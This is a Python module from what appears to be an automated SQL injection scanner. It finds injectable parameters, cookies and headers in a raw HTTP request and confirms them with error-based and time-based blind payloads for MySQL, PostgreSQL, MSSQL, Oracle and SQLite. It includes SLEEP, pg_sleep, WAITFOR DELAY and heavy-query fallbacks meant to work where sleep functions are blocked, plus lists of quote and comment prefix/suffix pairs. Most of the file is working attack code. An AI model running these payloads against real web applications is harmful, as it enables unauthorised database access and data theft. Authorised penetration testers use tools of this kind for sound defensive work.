
import time as _t
from dataclasses import dataclass
from pathlib import Path

from .http_client import Client, MARKER, status_of, body_of
from .exceptions import (
    RateLimitHit, RetryExhausted, SessionExpired, WafBlocked,
)
try:
    from .rich_ui import UI as _UI
except Exception:
    _UI = None

# Debug hook — populated lazily so scanner works standalone too.
try:
    from .auto import dbg as _dbg  # type: ignore
except Exception:
    def _dbg(msg, *_a, **_k):  # type: ignore
        return None
from . import error_based as EB


SKIP_COOKIES = {
    "session", "csrf", "csrftoken", "token", "auth", "authorization",
    "jwt", "__cfduid", "__cf_bm",
}
SKIP_COOKIE_PREFIXES = ("incap_ses_",)

SKIP_HEADERS = {
    "content-length", "content-type", "host", "connection",
    "accept-encoding",
}
SKIP_HEADER_PREFIXES = ("sec-", "sec-fetch-")

TEST_HEADERS = [
    "user-agent", "referer", "origin",
    "x-forwarded-for", "x-real-ip", "x-forwarded-host",
    "x-original-url", "x-rewrite-url", "forwarded", "client-ip", "via",
]


# Dialect priority and per-dialect time payloads.
DIALECT_ORDER = ["mysql", "postgres", "mssql", "oracle", "sqlite"]


# Time-vector templates per dialect.  Each entry builds (prefix + body +
# suffix) given a condition, delay seconds, prefix and suffix strings.
# `heavy` is a CPU-only fallback when SLEEP-like functions are blocked.

TIME_TEMPLATES = {
    "mysql": {
        "sleep": "IF(({c}), SLEEP({d}), 0)",
        "heavy": "IF(({c}), BENCHMARK(50000000, MD5('a')), 0)",
    },
    "postgres": {
        "sleep": "(SELECT CASE WHEN ({c}) THEN pg_sleep({d}) ELSE NULL END)",
        "heavy": ("(SELECT CASE WHEN ({c}) THEN "
                  "(SELECT COUNT(*) FROM generate_series(1,20000000)) "
                  "ELSE NULL END)"),
    },
    "mssql": {
        "sleep": "IF ({c}) WAITFOR DELAY '0:0:{d}'",
        "heavy": ("IF ({c}) (SELECT COUNT(*) FROM "
                  "sys.all_objects a, sys.all_objects b, sys.all_objects c)"),
    },
    "oracle": {
        "sleep": ("(SELECT CASE WHEN ({c}) THEN "
                  "dbms_pipe.receive_message(('a'),{d}) "
                  "ELSE NULL END FROM dual)"),
        "heavy": ("(SELECT CASE WHEN ({c}) THEN "
                  "(SELECT COUNT(*) FROM all_objects a, all_objects b, "
                  "all_objects c) ELSE NULL END FROM dual)"),
    },
    "sqlite": {
        "sleep": ("(SELECT CASE WHEN ({c}) THEN "
                  "(SELECT 1 FROM (SELECT 1) WHERE 1=randomblob(500000000)) "
                  "ELSE NULL END)"),
        "heavy": ("(SELECT CASE WHEN ({c}) THEN "
                  "(SELECT 1 FROM (SELECT 1) WHERE 1=randomblob(500000000)) "
                  "ELSE NULL END)"),
    },
}


# Single source of truth for prefix/suffix candidates.
# auto.py imports this list; do not duplicate it there.
PREFIX_CANDIDATES = [
    # "'-- " (with trailing space) is the canonical MySQL comment.
    # Bare "'--" is tried later: it only works if the next byte is
    # whitespace or newline in the original request.
    ("'",   "'-- "),
    ("'",   "'--"),
    ("'",   "' #"),
    ("'",   "#"),
    ("'",   "-- "),
    ("'",   "--"),
    ("'",   "/*"),
    ('"',   '"-- '),
    ('"',   '"--'),
    ('"',   "'-- "),
    ("')",  "'-- "),
    ("1",   "-- "),
    ("1",   "'-- "),
    ("%'",  "'-- "),
]

# Backwards-compat alias used by scan().
TIME_PREFIX_CANDIDATES = PREFIX_CANDIDATES


@dataclass
class Point:
    kind: str
    name: str
    base_value: str
    priority: int

    def describe(self):
        return f"[{self.kind:6}] {self.name} = {self.base_value!r}"


@dataclass
class Hit:
    point: object
    channel: str
    prefix: str
    suffix: str
    dialect: str
    template_name: str = ""
    template_body: str = ""


def _split_kv(s):
    out = []
    for part in s.split("&"):
        if not part:
            continue
        k, _, v = part.partition("=")
        out.append((k, v))
    return out


def _skip_cookie(name):
    n = name.strip().lower()
    if n in SKIP_COOKIES:
        return True
    for p in SKIP_COOKIE_PREFIXES:
        if n.startswith(p):
            return True
    return False


def _skip_header(name):
    n = name.strip().lower()
    if n in SKIP_HEADERS:
        return True
    for p in SKIP_HEADER_PREFIXES:
        if n.startswith(p):
            return True
    return False


def discover_points(raw):
    points = []
    from .http_client import RawRequest
    req = RawRequest(raw)

    if "?" in req.path:
        base, _, query = req.path.partition("?")
        for i, (k, v) in enumerate(_split_kv(query)):
            points.append(Point("url", k, v, 10 + i))

    ctype = ""
    for k, v in req.headers.items():
        if k.lower() == "content-type":
            ctype = v.lower()
            break
    if req.body and "application/x-www-form-urlencoded" in ctype:
        for i, (k, v) in enumerate(_split_kv(req.body)):
            points.append(Point("body", k, v, 30 + i))

    cookie_hdr = None
    for k, v in req.headers.items():
        if k.lower() == "cookie":
            cookie_hdr = v
            break
    if cookie_hdr:
        idx = 0
        for part in cookie_hdr.split(";"):
            s = part.strip()
            if not s or "=" not in s:
                continue
            name, _, val = s.partition("=")
            if _skip_cookie(name):
                continue
            points.append(Point("cookie", name.strip(), val.strip(),
                                50 + idx))
            idx += 1

    idx = 0
    for k, v in req.headers.items():
        if k.lower() not in TEST_HEADERS:
            continue
        if _skip_header(k):
            continue
        points.append(Point("header", k, v, 70 + idx))
        idx += 1

    return points


def _replace_in_query(path, name, marker):
    """Replace value of `name` in the query string.

    The marker is URL-encoded, so payloads with spaces, quotes, `#`,
    `(`, `)`, etc. do not break the HTTP request line. Only the marker
    itself is encoded — the original query stays byte-for-byte.
    """
    from urllib.parse import quote as _q
    base, _, query = path.partition("?")
    # Encode everything except url-safe default chars. We use safe=""
    # so `?`, `&`, `=`, `+`, `/` inside the payload don't get through.
    safe_marker = _q(marker, safe="")
    parts = _split_kv(query)
    new_parts = []
    for k, v in parts:
        if k == name:
            new_parts.append(f"{k}={v}{safe_marker}")
        else:
            new_parts.append(f"{k}={v}")
    return base + "?" + "&".join(new_parts)


def _replace_in_body(body, name, marker):
    parts = _split_kv(body)
    new_parts = []
    for k, v in parts:
        if k == name:
            new_parts.append(f"{k}={v}{marker}")
        else:
            new_parts.append(f"{k}={v}")
    return "&".join(new_parts)


def _replace_in_cookie(cookie_hdr, name, marker):
    out = []
    for part in cookie_hdr.split(";"):
        s = part.strip()
        if not s or "=" not in s:
            out.append(part)
            continue
        k, _, v = s.partition("=")
        if k.strip() == name:
            out.append(f"{k.strip()}={v.strip()}{marker}")
        else:
            out.append(s)
    return "; ".join(out)


def build_request_for_point(raw, point):
    marker = MARKER
    if point.kind == "url":
        lines = raw.split("\n")
        parts = lines[0].split()
        parts[1] = _replace_in_query(parts[1], point.name, marker)
        lines[0] = " ".join(parts)
        return "\n".join(lines)
    if point.kind == "body":
        head, _, _b = raw.partition("\n\n")
        new_body = _replace_in_body(_b, point.name, marker)
        return head + "\n\n" + new_body
    if point.kind == "cookie":
        lines = raw.split("\n")
        for i, ln in enumerate(lines):
            if ln.lower().startswith("cookie:"):
                orig = ln.split(":", 1)[1].strip()
                lines[i] = "Cookie: " + _replace_in_cookie(orig,
                                                          point.name,
                                                          marker)
                break
        return "\n".join(lines)
    if point.kind == "header":
        lines = raw.split("\n")
        for i, ln in enumerate(lines):
            if ":" not in ln:
                continue
            k, _, v = ln.partition(":")
            if k.strip().lower() == point.name.lower():
                lines[i] = f"{k.strip()}: {v.strip()}{marker}"
                break
        return "\n".join(lines)
    raise ValueError(f"unknown kind: {point.kind}")


def _send_raw(client, raw):
    from .http_client import RawRequest
    req = RawRequest(raw)
    kw = req.render("")
    return client.session.request(
        kw["method"], kw["url"],
        headers=kw["headers"], data=kw["data"],
        allow_redirects=False, timeout=30,
    )


def _send_raw_timed(client, raw, timeout):
    from .http_client import RawRequest
    req = RawRequest(raw)
    kw = req.render("")
    t0 = _t.time()
    try:
        client.session.request(
            kw["method"], kw["url"],
            headers=kw["headers"], data=kw["data"],
            allow_redirects=False, timeout=timeout,
        )
    except Exception:
        pass
    return _t.time() - t0


def _baseline(client, raw, cache=None):
    if cache is not None and "default" in cache:
        return cache["default"]
    r = _send_raw(client, raw)
    res = (status_of(r), len(body_of(r)))
    if cache is not None:
        cache["default"] = res
    return res


def break_test(client, raw, point, cache=None):
    base_status, base_len = _baseline(client, raw, cache)
    patched = build_request_for_point(raw, point)
    # Count how many probes actually made it to the wire. For URL points,
    # a single bad char in the request line causes a transport error
    # before the request is even sent, and that is NOT a SQLi signal.
    sent = 0
    signal = False
    for probe in ("'", "''"):
        try:
            r = _send_raw(client, patched.replace(MARKER, probe))
            sent += 1
        except Exception:
            continue
        st = status_of(r)
        ln = len(body_of(r))
        if st != base_status:
            signal = True
            break
        if abs(ln - base_len) > 40:
            signal = True
            break
    if getattr(point, "kind", "") == "url" and sent < 1:
        # nothing was even sent -> transport problem, not injection
        return False
    return signal


def test_point_error(client, raw, point,
                     prefix="'", suffix="'--", error_codes=(500,)):
    # URL-point payloads are fragile: a single space or quote in the
    # request line turns the whole probe into a transport error, not
    # a SQL error. Skip them here; they are handled by explicit
    # --channel selection if the user really wants them.
    if getattr(point, "kind", "") == "url":
        return None
    patched = build_request_for_point(raw, point)
    # Priority: MySQL/PostgreSQL first — most common dialects.
    _prio = ["mysql", "postgres", "mssql", "oracle", "sqlite"]
    dialects = [d for d in _prio if d in EB.all_error_dialects()]
    for dialect in dialects:
        for name, tpl in EB.templates_for(dialect):
            t_sql = EB.build_payload(tpl, "1=1", prefix=prefix,
                                     suffix=suffix)
            f_sql = EB.build_payload(tpl, "1=2", prefix=prefix,
                                     suffix=suffix)
            # Double-check: 1=1 must error TWICE, 1=2 must NOT error TWICE.
            # Otherwise it is a flaky 500 (WAF, transient, parse error)
            # and we skip it.
            try:
                codes = []
                for _ in range(2):
                    r_t = _send_raw(client, patched.replace(MARKER, t_sql))
                    codes.append(status_of(r_t))
                for _ in range(2):
                    r_f = _send_raw(client, patched.replace(MARKER, f_sql))
                    codes.append(status_of(r_f))
            except Exception:
                continue
            t1, t2, f1, f2 = codes
            if (t1 in error_codes and t2 in error_codes and
                    f1 not in error_codes and f2 not in error_codes):
                return Hit(point, "error", prefix, suffix, dialect,
                           name, tpl)
    return None


def _baseline_time(client, raw, samples=2):
    # Best-of-N baseline in seconds.
    times = []
    for _ in range(samples):
        t0 = _t.time()
        try:
            _send_raw(client, raw)
        except Exception:
            continue
        times.append(_t.time() - t0)
    if not times:
        return 0.0
    return sorted(times)[0]


def test_point_time_all(client, raw, point, delay=5, verbose=True):
    # Try every dialect and every time template. Returns first Hit.
    if getattr(point, "kind", "") == "url":
        # See test_point_error: URL payloads are not safely testable
        # without a per-target encoding strategy.
        if verbose:
            print("    [time] skipped: url point")
        return None
    patched = build_request_for_point(raw, point)
    baseline = _baseline_time(client, raw, samples=2)
    if verbose:
        print(f"    [time] baseline={baseline:.2f}s")

    threshold = max(2.0, baseline + delay * 0.5)

    for prefix, suffix in TIME_PREFIX_CANDIDATES:
        for dialect in DIALECT_ORDER:
            tpls = TIME_TEMPLATES.get(dialect)
            if not tpls:
                continue
            for tpl_name in ("sleep", "heavy"):
                tpl = tpls.get(tpl_name)
                if not tpl:
                    continue

                t_body = tpl.format(c="1=1", d=delay)
                f_body = tpl.format(c="1=2", d=delay)
                t_sql = f"{prefix}{t_body}{suffix}"
                f_sql = f"{prefix}{f_body}{suffix}"

                timeout = delay + 15
                dt_t = _send_raw_timed(
                    client, patched.replace(MARKER, t_sql), timeout)
                dt_f = _send_raw_timed(
                    client, patched.replace(MARKER, f_sql), timeout)

                ok = dt_t >= threshold and dt_f < threshold * 0.6

                if verbose:
                    mark = "  <== HIT" if ok else ""
                    print(f"    [time] {dialect:9}/{tpl_name:6} "
                          f"p={prefix!r:6} s={suffix!r:6} "
                          f"true={dt_t:.2f}s false={dt_f:.2f}s{mark}")

                if ok:
                    return Hit(point, "time", prefix, suffix, dialect,
                               f"{dialect}_{tpl_name}", t_body)
    return None


def scan(raw, delay=5, stop_on_first=True, verbose=False,
         dry_run=False, cfg=None):
    points = discover_points(raw)
    print(f"\n[scan] discovered {len(points)} candidate points:")
    for p in points:
        print(f"    {p.describe()}")

    if not points:
        return []

    if cfg is None:
        from .config import Config
        cfg = Config(
            campaign_dir=Path('.'),
            delay=delay,
            debug=verbose,
            permission_granted=True,
        )
    client = Client(raw, cfg)
    hits = []

    # Baseline cache: (status, body_len) for the untouched request.
    # Avoids re-sending the original request for every candidate point.
    baseline_cache = {}
    try:
        _r = _send_raw(client, raw)
        baseline_cache["default"] = (status_of(_r), len(body_of(_r)))
    except Exception:
        baseline_cache["default"] = (0, 0)

    for p in points:
        print(f"\n[scan] testing {p.kind} '{p.name}'")
        try:
            if not break_test(client, raw, p, cache=baseline_cache):
                print("    break test: no change (skip)")
                continue
        except Exception as e:
            print(f"    break test EXCEPTION: {e!r}")
            continue
        _msg = "    break test: signal detected"
        if verbose and _dbg is not None:
            _dbg(_msg)
        print(_msg)

        hit = test_point_error(client, raw, p)
        if hit is None:
            print("    error: no match, trying time-based ...")
            hit = test_point_time_all(client, raw, p,
                                      delay=delay, verbose=True)
        if hit is None:
            print("    time: no match")
            continue

        print(f"    ==> {hit.channel} channel hit "
              f"(dialect={hit.dialect}, prefix={hit.prefix!r}, "
              f"suffix={hit.suffix!r})")
        hits.append(hit)

        if stop_on_first:
            break

    return hits
